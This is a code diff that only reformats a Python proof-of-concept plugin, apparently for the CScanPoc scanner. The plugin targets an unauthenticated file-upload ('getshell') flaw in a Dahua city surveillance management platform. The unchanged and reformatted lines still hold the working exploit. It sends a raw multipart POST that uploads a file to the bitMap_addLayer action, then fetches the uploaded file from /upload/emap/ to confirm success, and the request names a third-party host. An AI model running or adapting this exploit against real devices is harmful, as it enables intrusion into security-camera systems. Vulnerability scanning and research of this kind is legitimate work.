@@ -1,22 +1,23 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Dahuatech_0000' # 平台漏洞编号，留空
-    name = '大华城市安防监控系统平台管理未授权访问' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.MISCONFIGURATION # 漏洞类型
+    vuln_id = 'Dahuatech_0000'  # 平台漏洞编号，留空
+    name = '大华城市安防监控系统平台管理未授权访问'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.MISCONFIGURATION  # 漏洞类型
     disclosure_date = '2015-12-17'  # 漏洞公布时间
     desc = '''
         大华城市安防监控系统平台管理未授权访问getshell(可漫游)
-    ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=151421' # 漏洞来源
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=151421'  # 漏洞来源
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'Dahuatech'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -24,7 +25,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = 'aa6fc62b-c82b-4e3a-ac79-e1441ee105dd'
     author = '国光'  # POC编写者
-    create_date = '2018-05-25' # POC创建时间
+    create_date = '2018-05-25'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -34,7 +35,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            raw="""POST /emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null} HTTP/1.1
+            raw = """POST /emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null} HTTP/1.1
 Host: 4g.139hz.com
 Content-Length: 425
 Cache-Control: max-age=0
@@ -62,16 +63,17 @@ Content-Disposition: form-data; name="layerName"
 
 test
 ------WebKitFormBoundaryGcEYB5EKXKmZXB0R--"""
-            url = arg + "/emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null}"
-            code2, head, res, errcode, _ = hh.http(url ,raw=raw)
-            
+            url = arg + \
+                "/emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null}"
+            code2, head, res, errcode, _ = hh.http(url, raw=raw)
+
             if (code2 == 200):
-                m =  re.search('"path":"(.*?)",',res,re.S)
+                m = re.search('"path":"(.*?)",', res, re.S)
                 if m:
                     jsp = m.group(1)
-                    u = arg + '/upload/emap/' +jsp
-                    code2, head, res, errcode, _ = hh.http(u )
-                    if (code2==200) and '76666' in res:
+                    u = arg + '/upload/emap/' + jsp
+                    code2, head, res, errcode, _ = hh.http(u)
+                    if (code2 == 200) and '76666' in res:
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
 
